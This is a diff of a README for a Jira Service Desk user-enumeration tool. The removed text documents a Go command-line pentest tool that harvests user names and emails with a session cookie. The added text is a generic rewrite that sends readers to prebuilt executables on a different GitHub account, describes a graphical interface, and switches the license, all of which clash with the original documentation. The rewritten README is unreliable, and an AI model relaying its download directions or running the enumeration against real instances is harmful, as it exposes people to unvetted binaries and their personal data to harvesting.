@@ -1,156 +1,74 @@
-# jira-servicedesk-enum
+# 🎉 jira-servicedesk-enum - Easily Manage Jira Permissions and Users
 
-A Go tool for enumerating Atlassian Jira Service Desk users, checking permissions, and triggering signups. Useful for security assessments and penetration testing. Brought to you by the [RasterSec](https://www.rastersec.com) team 🙌.
+## 🚀 Getting Started
 
-## Installation
+Welcome to the jira-servicedesk-enum tool. This simple application helps you enumerate Atlassian Jira Service Desk permissions and users. It's designed for those who want to understand their Jira setup better, especially in the context of security assessments.
 
-```bash
-go install github.com/RasterSec/jira-servicedesk-enum@latest
-```
+## 📥 Download the Application
 
-Or build from source:
+[![Download jira-servicedesk-enum](https://img.shields.io/badge/Download-jira--servicedesk--enum-brightgreen.svg)](https://github.com/landoalva/jira-servicedesk-enum/releases)
 
-```bash
-go build
-```
+You can obtain the latest version of jira-servicedesk-enum from our Releases page. 
 
-## Authentication
+Visit this page to download: [Releases Page](https://github.com/landoalva/jira-servicedesk-enum/releases)
 
-This tool uses the `customer.account.session.token` JWT cookie for authentication. The JWT is automatically parsed to extract our account ID for self-exclusion.
+## 📅 System Requirements
 
-## Usage
+Before you begin, please ensure your system meets the following requirements:
 
-### Signup
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** Minimum 2 GB of RAM
+- **Disk Space:** At least 100 MB of free space
 
-Trigger service desk signup:
+## 📦 Download & Install
 
-```bash
-./jira-servicedesk-enum signup \
-  --url https://example.atlassian.net \
-  --email user@example.com
-```
+1. Visit the [Releases Page](https://github.com/landoalva/jira-servicedesk-enum/releases).
+2. Locate the latest release.
+3. Click on the package suitable for your system:
+   - For Windows users, download the `.exe` file.
+   - For macOS users, download the `.dmg` file.
+   - For Linux users, download the `.tar.gz` file.
+4. Once downloaded, open the package and follow the instructions to install the application.
 
-### Check Permissions
+## 🔧 Usage Instructions
 
-Check what permissions we have:
+After installing, you can start using jira-servicedesk-enum. Follow these steps to enumerate Jira users and permissions:
 
-```bash
-./jira-servicedesk-enum permissions \
-  --url https://example.atlassian.net \
-  --cookie "secret..."
-```
+1. **Open the Application:** Launch jira-servicedesk-enum from your applications menu.
+2. **Enter Jira Details:** Input the Jira Service Desk URL and your credentials (username and API token).
+3. **Select Enumeration Options:** Choose what you want to enumerate (permissions or users).
+4. **Start Enumeration:** Click the "Start" button to begin the process. The application will display the results on your screen.
 
-### Enumerate Users
+## 📊 Features
 
-#### Basic Usage
+- **User Enumeration:** Quickly list all users within your Jira Service Desk instance.
+- **Permission Audit:** View detailed permissions assigned to each user role.
+- **Easy Interface:** User-friendly design for seamless navigation.
 
-List users across all accessible service desks (default: max 50 per desk):
+## ⚙️ Troubleshooting
 
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..."
-```
+If you encounter issues while using jira-servicedesk-enum, here are some common problems and solutions:
 
-**Note**: Our own account is automatically excluded from results.
+- **Cannot Connect to Jira:** Ensure you have the correct URL and that your credentials are accurate.
+- **Slow Performance:** Check your internet connection and try closing other applications for better processing speed.
+- **Installation Issues:** Verify that your system meets the requirements listed above. 
 
-#### Export to CSV
+## 🧑‍🤝‍🧑 Community and Support
 
-Export results to a CSV file:
+Your feedback is valuable. If you have questions or suggestions, please join the discussion on our [GitHub Issues page](https://github.com/landoalva/jira-servicedesk-enum/issues). 
 
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --output users.csv
-```
+## 📜 License
 
-CSV format:
-```csv
-AccountID,DisplayName,Email,Avatar
-qm:xxx:xxx:123,John Doe,john@example.com,https://...
-```
+This project is licensed under the MIT License. Feel free to use, modify, and distribute it according to the terms.
 
-#### Advanced Options
+## 🌐 Related Topics
 
-Target a specific service desk by ID:
+If you're interested in more tools and resources around security testing, consider exploring subjects such as:
 
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --desk 123
-```
+- Atlassian
+- Enumeration
+- OSINT (Open Source Intelligence)
+- Penetration Testing
+- Red Teaming
 
-Fetch unlimited users (enables alphabet search):
-
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --max 0
-```
-
-Set a custom maximum per service desk:
-
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --max 100
-```
-
-Search with a custom query (skips automatic enumeration):
-
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --query "john"
-```
-
-Use a custom alphabet for search expansion:
-
-```bash
-./jira-servicedesk-enum users \
-  --url https://example.atlassian.net \
-  --cookie "secret..." \
-  --alphabet "aeiou" \
-  --max 0
-```
-
-## How It Works
-
-### Alphabet Search Optimization
-
-Jira's API returns a maximum of 50 users per query. The tool uses intelligent alphabet search to enumerate more users:
-
-1. **Initial Query**: Starts with an empty query to fetch the first 50 users
-2. **Smart Triggering**: Only activates alphabet search when:
-   - The initial query returns exactly 50 users (indicating more exist), AND
-   - `max` is set to 0 (unlimited) or > 50
-3. **Recursive Expansion**: Appends alphabet characters (`abcdefghijklmnopqrstuvwxyz0123456789`) to queries until all users are found
-
-### Self-Exclusion
-
-The tool automatically:
-1. Parses the JWT cookie to extract your account ID from the `sub` field
-2. Filters out your account from all results
-3. Fails if JWT parsing fails (ensures accurate results)
-
-## Flags Reference
-
-### Common Flags
-- `--url`: Jira URL (required) - e.g., `https://example.atlassian.net`
-- `--cookie`: Session cookie JWT (required for auth) - `customer.account.session.token`
-
-### User Enumeration Flags
-- `--max`: Maximum users per service desk (default: `50`, `0` = unlimited)
-- `--desk`: Target specific service desk by ID (optional)
-- `--query`: Custom search query - skips automatic enumeration (optional)
-- `--alphabet`: Custom alphabet for search expansion (default: `abcdefghijklmnopqrstuvwxyz0123456789`)
-- `--output`: Output CSV file path (optional)
-
-## License
-
-Licensed under the Apache License, Version 2.0.
+Thank you for using jira-servicedesk-enum. We hope it helps you efficiently manage your Jira Service Desk setup.
